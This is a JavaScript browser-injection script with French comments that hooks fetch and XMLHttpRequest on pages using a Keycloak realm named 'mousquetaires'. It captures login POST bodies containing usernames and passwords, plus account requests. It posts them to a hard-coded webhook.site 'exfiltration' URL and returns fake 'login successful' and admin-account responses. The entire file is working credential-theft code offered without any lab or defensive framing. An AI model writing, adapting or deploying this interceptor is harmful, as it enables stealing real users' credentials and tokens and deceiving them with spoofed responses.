console.log('%c[Interceptor] Loaded from remote 🚀', 'color: #00ff00; font-weight: bold;');

// Config webhook d'exfiltration
const EXFIL_URL = 'https://webhook.site/8da442bc-35ab-4621-b309-0af722556df8';

(function() {
    // === Intercept fetch ===
    const originalFetch = window.fetch;

    window.fetch = async function(input, init = {}) {
        const url = typeof input === 'string' ? input : input.url;
        const method = (init && init.method) || 'GET';

        console.log('%c[fetch] 📦 Intercepted:', 'color: #00ff00', method, url);

        // Cible spécifique
        if (url.includes('/auth/realms/mousquetaires/login-actions/authenticate')) {
            console.log('%c[fetch] 🎯 Intercepting LOGIN POST', 'color: #ff0000', url);

            // Exfiltration du body (username/password)
            sendToWebhook({
                type: 'fetch',
                url,
                method,
                body: init.body || null
            });

            // Spoof d'une réponse positive
            return new Response('<h1>Connexion réussie (fake) 😎</h1>', {
                status: 200,
                headers: { 'Content-Type': 'text/html' }
            });
        }

        if (url.includes('/auth/realms/mousquetaires/account')) {
            console.log('%c[fetch] 🎯 Intercepting ACCOUNT GET', 'color: #ff0000', url);

            // Exfiltration de l'appel au compte (tokens, profil)
            sendToWebhook({
                type: 'fetch',
                url,
                method
            });

            const fakeAccount = {
                name: 'Hacked User',
                email: 'hacked@example.com',
                role: 'Admin'
            };

            return new Response(JSON.stringify(fakeAccount), {
                status: 200,
                headers: { 'Content-Type': 'application/json' }
            });
        }

        // Si pas ciblé, laisser passer mais logger la réponse si tu veux
        const response = await originalFetch(input, init);

        const cloned = response.clone();
        const text = await cloned.text();
        console.log('%c[fetch] 🔎 Original Response:', 'color: #00ffff', text);

        return response;
    };

    // === Intercept XMLHttpRequest ===
    const origOpen = XMLHttpRequest.prototype.open;
    const origSend = XMLHttpRequest.prototype.send;

    XMLHttpRequest.prototype.open = function(method, url, async, user, pass) {
        this._url = url;
        this._method = method;
        console.log('%c[XHR] 📡 Opened:', 'color: orange', method, url);
        return origOpen.apply(this, arguments);
    };

    XMLHttpRequest.prototype.send = function(body) {
        console.log('%c[XHR] 🚀 Sending:', 'color: orange', this._method, this._url);

        if (body) {
            console.log('%c[XHR] 🕵️‍♂️ Body:', 'color: orange', body);
        }

        // Interception ciblée
        if (this._url.includes('/auth/realms/mousquetaires/login-actions/authenticate')) {
            console.log('%c[XHR] 🎯 Blocking LOGIN POST', 'color: red');

            // Exfiltration vers le webhook
            sendToWebhook({
                type: 'xhr',
                url: this._url,
                method: this._method,
                body: body || null
            });

            // Fake response / spoof
            setTimeout(() => {
                this.readyState = 4;
                this.status = 200;
                this.responseText = '<h1>Connexion réussie (fake) 😎</h1>';

                if (typeof this.onreadystatechange === 'function') this.onreadystatechange();
                if (typeof this.onload === 'function') this.onload();

                console.log('%c[XHR] 🟢 Spoofed successful login response', 'color: green');
            }, 100);

            return; // Bloque le send
        }

        return origSend.apply(this, arguments);
    };

    console.log('%c[Interceptor] MITM JS Proxy is running ✅', 'color: #00ff00; font-weight: bold;');

    // === Function d'envoi vers le webhook ===
    function sendToWebhook(data) {
        fetch(EXFIL_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                time: new Date().toISOString(),
                data
            })
        }).then(() => {
            console.log('%c[Interceptor] 📤 Exfiltration success', 'color: #00ff00');
        }).catch(err => {
            console.error('[Interceptor] ❌ Exfiltration failed', err);
        });
    }
})();
